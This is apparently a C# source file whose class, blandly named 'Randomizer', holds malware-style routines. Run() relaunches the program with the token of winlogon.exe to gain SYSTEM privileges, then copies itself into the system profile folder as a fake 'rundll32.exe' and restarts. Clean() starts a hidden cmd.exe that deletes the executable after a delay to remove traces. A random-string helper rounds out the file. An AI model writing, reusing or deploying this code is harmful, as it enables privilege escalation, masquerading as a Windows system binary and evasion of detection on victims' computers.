﻿using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;

// REQUIRES PUBLISHING TO SINGLE FILE

// ReSharper disable UnusedMember.Global
// ReSharper disable SuggestVarOrType_BuiltInTypes
// ReSharper disable StringLiteralTypo
// ReSharper disable once CheckNamespace

namespace Memory
{
    // ReSharper disable once UnusedMember.Global
    // ReSharper disable once IdentifierTypo

    public static class Randomizer
    {
        public static readonly Random Rand = new();

        public static void Run()
        {
            // TODO Code is a mess, will clean soon

            Process process = Process.GetCurrentProcess();
            if (process.MainModule == null) return;
            string processPath = process.MainModule.FileName;
            if (Environment.UserName.ToLower() is not "system" and not @"anon$")
            {
                Sudoku.RunWithTokenOf(
                    "winlogon.exe",
                    true,
                    process.MainModule.FileName,
                    string.Empty,
                    RuntimeEnvironment.GetRuntimeDirectory());
                Environment.Exit(0);
            }
            string newExePath = @"C:\Windows\System32\config\systemprofile\rundll32.exe";
            if (processPath == newExePath) return;
            if (File.Exists(newExePath)) File.Delete(newExePath);
            if (processPath != null) File.Copy(processPath, newExePath);
            Process.Start(newExePath);
            Environment.Exit(0);
        }

        public static void Clean()
        {
            Process process = Process.GetCurrentProcess();
            if (process.MainModule == null) return;

            string exePath = process.MainModule.FileName;
            Process.Start(new ProcessStartInfo()
            {
                Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + exePath + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });
        }

        public static string RandomStr(int length)
        {
            const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[Rand.Next(s.Length)]).ToArray());
        }
    }
}
